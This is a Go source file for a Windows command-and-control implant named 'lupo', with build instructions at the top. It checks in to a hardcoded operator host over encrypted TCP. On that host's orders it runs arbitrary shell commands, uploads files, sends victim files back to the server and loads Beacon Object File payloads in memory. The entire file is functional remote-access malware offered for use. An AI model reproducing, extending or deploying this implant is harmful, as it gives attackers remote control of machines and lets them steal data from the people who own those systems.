package main

// Build: CGO_ENABLED=1 GOOS=windows GOARCH=amd64 CC=x86_64-w64-mingw32-gcc go build -o lupo_implant_tcp_enc_coff.exe lupo_implant_tcp_enc_coff.go

import (
	"bufio"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	crand "crypto/rand"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"time"

	"github.com/mattn/go-shellwords"
	"github.com/parzel/GoBofRunner/bof"
)

// ── Configuration ─────────────────────────────────────────────────────────────

// lupoImplant holds all runtime state for a single implant instance.
// SessionID and UUID are kept entirely in memory — never written to disk.
type lupoImplant struct {
	updateInterval int
	rhost          string
	rport          int
	sessionID      int
	uuid           string
	psk            string
	data           string
	operator       string
	filename       string
	file           string
	registered     bool
}

// ── Wire types ─────────────────────────────────────────────────────────────────

// RegistrationResponse maps the server's initial session-grant reply.
type RegistrationResponse struct {
	SessionID int    `json:"sessionID"`
	UUID      string `json:"UUID"`
}

// CommandResponse maps the server's check-in reply carrying the next command.
type CommandResponse struct {
	Cmd  string `json:"cmd"`
	User string `json:"user"`
}

// RegistrationRequest is the JSON payload sent for first-time registration.
type RegistrationRequest struct {
	PSK                 string  `json:"PSK"`
	SessionID           int     `json:"SessionID"`
	ImplantArch         string  `json:"ImplantArch"`
	Update              float64 `json:"Update"`
	AdditionalFunctions string  `json:"AdditionalFunctions,omitempty"`
	Register            bool    `json:"Register"`
}

// CheckInRequest is the JSON payload sent on every subsequent check-in.
// The Data field carries JSON-escaped output from the previous command.
// Username identifies the operator the response should be routed to.
type CheckInRequest struct {
	PSK         string  `json:"PSK"`
	SessionID   int     `json:"SessionID"`
	UUID        string  `json:"UUID"`
	Data        string  `json:"Data,omitempty"`
	ImplantArch string  `json:"ImplantArch"`
	Update      float64 `json:"Update"`
	Username    string  `json:"Username,omitempty"`
	Register    bool    `json:"Register"`
	FileName    string  `json:"FileName,omitempty"`
	File        string  `json:"File,omitempty"`
}

// ── Global implant instance ────────────────────────────────────────────────────

var implant *lupoImplant

// cryptoPSK is the AES-256-GCM pre-shared key for the encrypted TCP channel.
// Must be 16, 24, or 32 bytes to select AES-128/192/256 respectively.
// Set to empty string "" to disable encryption (plain TCP mode).
const cryptoPSK = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" //obviously don't use this key in a real deployment :)

// ── Entry point ────────────────────────────────────────────────────────────────

func main() {
	updateInterval := 5
	jitterMin := 2
	jitterMax := 10

	implant = &lupoImplant{
		updateInterval: updateInterval,
		rhost:          "192.168.3.227",
		rport:          9999,
		sessionID:      -1,
		uuid:           "",
		psk:            "wolfpack",
		data:           "",
		operator:       "",
		filename:       "",
		file:           "",
		registered:     false,
	}

	for {
		rand.Seed(time.Now().UnixNano())
		jitter := rand.Intn(jitterMax-jitterMin+1) + jitterMin
		implant.updateInterval = updateInterval + jitter

		execLoop()

		time.Sleep(time.Duration(implant.updateInterval) * time.Second)
	}
}

// ── Check-in loop ──────────────────────────────────────────────────────────────

func execLoop() bool {
	arch := getArchitecture()

	// ── Registration ──────────────────────────────────────────────────────────
	if !implant.registered {
		regReq := RegistrationRequest{
			PSK:                 implant.psk,
			SessionID:           0,
			ImplantArch:         arch,
			Update:              float64(implant.updateInterval),
			AdditionalFunctions: buildCustomFunctions(),
			Register:            true,
		}

		response, err := sendTCP(regReq)
		if err != nil || response == "" {
			return false
		}

		var regResp RegistrationResponse
		if err = json.Unmarshal([]byte(response), &regResp); err != nil {
			return false
		}

		if regResp.SessionID > 0 && regResp.UUID != "" {
			implant.sessionID = regResp.SessionID
			implant.uuid = regResp.UUID
			implant.registered = true
		}
		return true
	}

	// ── Standard check-in (carries pending output from the previous command) ──
	checkIn := CheckInRequest{
		PSK:         implant.psk,
		SessionID:   implant.sessionID,
		UUID:        implant.uuid,
		Data:        implant.data,
		ImplantArch: arch,
		Update:      float64(implant.updateInterval),
		Username:    implant.operator,
		Register:    false,
		FileName:    implant.filename,
		File:        implant.file,
	}

	// Clear pending state before sending so a network failure doesn't resend stale data
	implant.data = ""
	implant.operator = ""
	implant.filename = ""
	implant.file = ""

	response, err := sendTCP(checkIn)
	if err != nil {
		return false
	}
	if response == "" {
		return true
	}

	// Distinguish re-registration from a normal command response
	hasCmd := strings.Contains(response, `"cmd"`)

	if !hasCmd {
		// Server issued new credentials (persistence reconnect)
		var regResp RegistrationResponse
		if err = json.Unmarshal([]byte(response), &regResp); err == nil &&
			regResp.SessionID > 0 && regResp.UUID != "" {
			implant.sessionID = regResp.SessionID
			implant.uuid = regResp.UUID
		}
		return true
	}

	var cmdResp CommandResponse
	if err = json.Unmarshal([]byte(response), &cmdResp); err != nil {
		return false
	}

	if cmdResp.Cmd != "" {
		operator := cmdResp.User
		if operator == "" {
			operator = "server"
		}
		executeCommand(cmdResp.Cmd, operator)
	}

	return true
}

// ── TCP transport ──────────────────────────────────────────────────────────────

// sendTCP marshals message to JSON, optionally encrypts it with AES-256-GCM,
// sends it to the C2 with the required trailing newline, then reads and
// optionally decrypts the server's response.
//
// Encrypted mode: plaintext JSON is encrypted before sending; the server's
// binary response is read until timeout/EOF then decrypted.
// Plain mode: JSON is sent as-is; brace-counting detects the end of the
// server's JSON response.
func sendTCP(message interface{}) (string, error) {
	jsonData, err := json.Marshal(message)
	if err != nil {
		return "", err
	}

	conn, err := net.DialTimeout("tcp", implant.rhost+":"+strconv.Itoa(implant.rport), 5*time.Second)
	if err != nil {
		return "", err
	}
	defer conn.Close()

	conn.SetReadDeadline(time.Now().Add(5 * time.Second))

	// ── Outbound ──────────────────────────────────────────────────────────────
	// CRITICAL: server reads with ReadString('\n') — newline terminator required.
	var payload []byte
	if cryptoPSK != "" {
		ciphertext, err := encryptTCP(jsonData)
		if err != nil {
			return "", err
		}
		// Base64-encode so the payload contains no embedded 0x0A bytes that would
		// cause the server's bufio.ReadString('\n') to truncate mid-ciphertext.
		encoded := base64.StdEncoding.EncodeToString(ciphertext)
		payload = append([]byte(encoded), '\n')
	} else {
		payload = append(jsonData, '\n')
	}

	if _, err = conn.Write(payload); err != nil {
		return "", err
	}

	// ── Inbound ───────────────────────────────────────────────────────────────
	if cryptoPSK != "" {
		// Server base64-encodes the AES-256-GCM ciphertext before writing.
		// Read until EOF/timeout to get the complete payload, then decode and decrypt.
		rawBytes, _ := ioutil.ReadAll(conn)
		if len(rawBytes) == 0 {
			return "", nil
		}
		decoded, err := base64.StdEncoding.DecodeString(strings.TrimSpace(string(rawBytes)))
		if err != nil {
			return "", err
		}
		plaintext, err := decryptTCP(decoded)
		if err != nil {
			return "", err
		}
		return string(plaintext), nil
	}

	// Plain mode: server sends one JSON object WITHOUT a trailing newline;
	// use brace-counting to detect the end of the object.
	reader := bufio.NewReader(conn)
	var resp strings.Builder
	braceDepth := 0
	inResponse := false

	for {
		b, err := reader.ReadByte()
		if err != nil {
			break
		}
		resp.WriteByte(b)
		if b == '{' {
			inResponse = true
			braceDepth++
		} else if b == '}' {
			braceDepth--
			if inResponse && braceDepth == 0 {
				break
			}
		}
	}

	return resp.String(), nil
}

// ── Command execution ──────────────────────────────────────────────────────────

// executeCommand parses and dispatches a server-issued command string.
// Results are stored in the implant struct for delivery on the next check-in.
func executeCommand(cmdStr string, operator string) {
	parsedCmd, err := shellwords.Parse(cmdStr)
	if err != nil || len(parsedCmd) == 0 {
		return
	}

	cmd := parsedCmd[0]
	argS := parsedCmd[1:]

	// Store the operator so the next check-in routes the output correctly
	implant.operator = operator

	// ── Commands that take arguments ──────────────────────────────────────────
	if cmd != "" && len(argS) > 0 {
		switch cmd {

		case "cd":
			if err := os.Chdir(strings.Join(argS, " ")); err != nil {
				implant.data = err.Error()
			}

		case "upload":
			fname := argS[0]
			decoded, err := base64.StdEncoding.DecodeString(strings.Join(argS[1:], " "))
			if err != nil {
				implant.data = "Error decoding upload: " + err.Error()
				return
			}
			f, err := os.Create(fname)
			if err != nil {
				implant.data = "Error creating file: " + err.Error()
				return
			}
			defer f.Close()
			f.Write(decoded)
			f.Sync()

		case "download":
			fname := argS[0]
			content, err := ioutil.ReadFile(fname)
			if err != nil {
				implant.data = "Error reading file: " + err.Error()
				return
			}
			implant.filename = fname
			implant.file = base64.StdEncoding.EncodeToString(content)

		case "updateinterval":
			n, err := strconv.Atoi(argS[0])
			if err != nil {
				implant.data = "Invalid interval: " + err.Error()
				return
			}
			implant.updateInterval = n
			implant.data = "Implant interval updated to: " + strconv.Itoa(implant.updateInterval)

		case "bof_loader":
			// Wire format: "bof_loader [type:arg ...] <base64-coff>"
			// The last token is always the base64-encoded COFF binary.
			// Every token before it is a type-prefixed BOF argument (may be empty).
			if len(argS) < 1 {
				implant.data = "Error: bof_loader requires a COFF binary"
				return
			}

			coffB64 := argS[len(argS)-1]
			argTokens := argS[:len(argS)-1]

			coffBytes, err := base64.StdEncoding.DecodeString(coffB64)
			if err != nil {
				implant.data = "Error decoding BOF binary: " + err.Error()
				return
			}
			if len(coffBytes) == 0 {
				implant.data = "Error: BOF binary is empty"
				return
			}

			beaconArgs := packBOFArgs(argTokens)

			// Execute with panic recovery so a bad BOF doesn't kill the implant
			func() {
				defer func() {
					if r := recover(); r != nil {
						implant.data = fmt.Sprintf("BOF crashed: %v", r)
					}
				}()
				result := bof.ParseCoff(coffBytes, beaconArgs)
				if result != "" {
					implant.data = result
				} else {
					implant.data = "BOF execution completed with no output"
				}
			}()

		default:
			out, err := exec.Command(cmd, argS...).CombinedOutput()
			if err != nil {
				implant.data = strings.TrimSpace(string(out)) + "\n" + err.Error()
				return
			}
			implant.data = strings.TrimSpace(string(out))
		}

		return
	}

	// ── Commands with no arguments ────────────────────────────────────────────
	if cmd != "" {
		switch cmd {
		case "exit":
			os.Exit(0)
		case "ping":
			implant.data = "pong"
		default:
			out, err := exec.Command(cmd).CombinedOutput()
			if err != nil {
				implant.data = strings.TrimSpace(string(out)) + "\n" + err.Error()
				return
			}
			implant.data = strings.TrimSpace(string(out))
		}
	}
}

// ── BOF argument packing ───────────────────────────────────────────────────────

// packBOFArgs converts type-prefixed argument tokens into the binary beacon-args
// buffer expected by the COFF runtime (GoBofRunner).
//
// Supported prefixes (case-insensitive):
//   wstring: / z:   – UTF-16LE wide string (default when no prefix is given)
//   string:  / s:   – ASCII/null-terminated string
//   int:     / i:   – 32-bit unsigned integer (decimal or 0x-prefixed hex)
//   short:           – 16-bit unsigned integer
func packBOFArgs(tokens []string) []byte {
	buf := &bof.BOFArgsBuffer{Buffer: new(bytes.Buffer)}

	for _, token := range tokens {
		if token == "" {
			continue
		}

		parts := strings.SplitN(token, ":", 2)
		if len(parts) == 2 {
			argType := strings.ToLower(parts[0])
			argVal := parts[1]

			switch argType {
			case "wstring", "z":
				buf.AddWString(argVal)

			case "string", "s":
				buf.AddString(argVal)

			case "int", "integer", "i":
				// Try decimal first, then 0x-prefixed or bare hex
				if v, err := strconv.Atoi(argVal); err == nil {
					buf.AddInt(uint32(v))
				} else if v, err := strconv.ParseUint(strings.TrimPrefix(argVal, "0x"), 16, 32); err == nil {
					buf.AddInt(uint32(v))
				}

			case "short":
				if v, err := strconv.Atoi(argVal); err == nil {
					buf.AddShort(uint16(v))
				}

			default:
				// Unrecognised prefix — treat the whole token as a wide string
				buf.AddWString(token)
			}
		} else {
			// No prefix — default to wide string (matches CS BOF convention)
			buf.AddWString(token)
		}
	}

	result, _ := buf.GetBuffer()
	return result
}

// ── AES-256-GCM helpers ───────────────────────────────────────────────────────

// encryptTCP encrypts plaintext with AES-256-GCM using cryptoPSK.
// Output layout: nonce (12 bytes) || ciphertext || GCM tag (16 bytes).
// This matches the server-side encrypt() in lupo-server/server/tcp.go exactly.
func encryptTCP(plaintext []byte) ([]byte, error) {
	block, err := aes.NewCipher([]byte(cryptoPSK))
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err = io.ReadFull(crand.Reader, nonce); err != nil {
		return nil, err
	}
	return gcm.Seal(nonce, nonce, plaintext, nil), nil
}

// decryptTCP decrypts AES-256-GCM ciphertext produced by encryptTCP (or the
// server-side encrypt()). Expects nonce prepended to the ciphertext.
func decryptTCP(ciphertext []byte) ([]byte, error) {
	block, err := aes.NewCipher([]byte(cryptoPSK))
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize {
		return nil, errors.New("ciphertext too short")
	}
	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
	return gcm.Open(nil, nonce, ciphertext, nil)
}

// ── Helpers ────────────────────────────────────────────────────────────────────

func getArchitecture() string {
	return runtime.GOOS + "/" + runtime.GOARCH
}

// buildCustomFunctions returns the JSON map of custom implant commands to
// register with the server.  Add any additional custom handlers here.
func buildCustomFunctions() string {
	return `{"bof_loader":"executes a BOF/COFF payload synchronously and returns output"}`
}
